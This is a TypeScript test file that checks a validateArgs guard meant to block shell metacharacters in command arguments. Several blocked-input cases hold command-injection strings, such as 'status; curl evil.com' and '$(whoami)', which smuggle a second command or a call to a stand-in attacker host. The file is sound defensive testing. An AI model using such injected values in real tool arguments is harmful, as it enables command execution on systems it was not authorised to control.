// src/guard.test.ts
import { describe, it, expect } from "vitest";
import { validateArgs } from "./guard.js";

describe("validateArgs — safe inputs", () => {
  it("allows plain args", () => {
    expect(validateArgs("status").safe).toBe(true);
  });
  it("allows double-quoted string with spaces", () => {
    expect(validateArgs('log --format="%H %s"').safe).toBe(true);
  });
  it("allows pipe inside double quotes (regex alternation)", () => {
    expect(validateArgs('"foo|bar"').safe).toBe(true);
  });
  it("allows semicolon inside single quotes", () => {
    expect(validateArgs("'foo;bar'").safe).toBe(true);
  });
  it("allows redirect inside quotes", () => {
    expect(validateArgs('"a>b"').safe).toBe(true);
  });
  it("allows plain $VAR expansion", () => {
    expect(validateArgs("log $BRANCH").safe).toBe(true);
  });
  it("allows hyphen flags", () => {
    expect(validateArgs("--no-pager log -n 10").safe).toBe(true);
  });
});

describe("validateArgs — blocked inputs", () => {
  it("blocks semicolon outside quotes", () => {
    const r = validateArgs("status; curl evil.com");
    expect(r.safe).toBe(false);
    expect(r.reason).toMatch(/semicolon/);
  });
  it("blocks && outside quotes", () => {
    const r = validateArgs("status && curl evil.com");
    expect(r.safe).toBe(false);
    expect(r.reason).toMatch(/&&/);
  });
  it("blocks || outside quotes", () => {
    const r = validateArgs("status || curl evil.com");
    expect(r.safe).toBe(false);
    expect(r.reason).toMatch(/\|\|/);
  });
  it("blocks pipe outside quotes", () => {
    const r = validateArgs("log | cat");
    expect(r.safe).toBe(false);
    expect(r.reason).toMatch(/pipe/);
  });
  it("blocks redirect > outside quotes", () => {
    const r = validateArgs("log > patch.txt");
    expect(r.safe).toBe(false);
    expect(r.reason).toMatch(/redirect/);
  });
  it("blocks redirect < outside quotes", () => {
    const r = validateArgs("commit -F < msg.txt");
    expect(r.safe).toBe(false);
    expect(r.reason).toMatch(/redirect/);
  });
  it("blocks backtick substitution", () => {
    const r = validateArgs("log `whoami`");
    expect(r.safe).toBe(false);
    expect(r.reason).toMatch(/backtick/);
  });
  it("blocks $( substitution", () => {
    const r = validateArgs("log $(whoami)");
    expect(r.safe).toBe(false);
    expect(r.reason).toMatch(/command substitution/);
  });
  it("blocks <( process substitution", () => {
    const r = validateArgs("diff <(cat a) <(cat b)");
    expect(r.safe).toBe(false);
    expect(r.reason).toMatch(/process substitution/);
  });
});
